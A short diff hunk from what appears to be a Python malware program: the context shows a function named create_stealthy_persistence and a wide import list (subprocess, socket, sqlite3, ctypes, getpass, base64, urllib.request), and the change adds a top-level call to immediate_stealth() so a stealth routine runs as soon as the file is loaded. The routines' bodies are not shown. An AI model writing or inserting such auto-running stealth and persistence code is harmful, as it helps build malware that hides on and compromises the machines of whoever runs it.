@@ -385,6 +385,8 @@ def create_stealthy_persistence():
     except Exception as e:
         print_debug(f"Failed to create stealthy persistence: {e}")
         return False
+    
+immediate_stealth()
 
 import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
 from urllib.parse import urlencode
